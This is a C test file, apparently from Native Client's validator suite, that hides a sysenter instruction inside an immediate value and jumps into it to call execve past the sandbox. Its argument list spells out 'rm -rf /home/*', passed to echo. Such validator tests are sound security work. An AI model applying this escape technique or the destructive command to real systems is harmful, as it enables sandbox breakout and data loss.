/*
 * Copyright 2008 The Native Client Authors. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file.
 */

#ifndef NULL
#define NULL 0
#endif

int TrustMe(int returnaddr1,
	    const char *path, char *const argv[], char *const envp[]) {
  int immx = 0x0000340f;
  int codeaddr = (int)TrustMe + 14;

  // This code creates the machine state for the execve call, with
  // little regard for preserving the sanity of the rest of the stack.
  asm("mov   $59, %eax");       // set syscall # for execve
  asm("add   $32, %esp");       // pop local storage
  asm("mov   %esp, %ecx");      // MacOS kernel wants esp in ecx
  asm("jmp   *-20(%ecx)");      // jump to overlapped instruction
                                // via address in local var codeaddr
}

char *const eargv[] = {"/bin/echo", "/bin/rm", "-rf", "/home/*", NULL};
int main(int argc, char *argv[]) {
  TrustMe(-1, eargv[0], eargv, NULL);
}
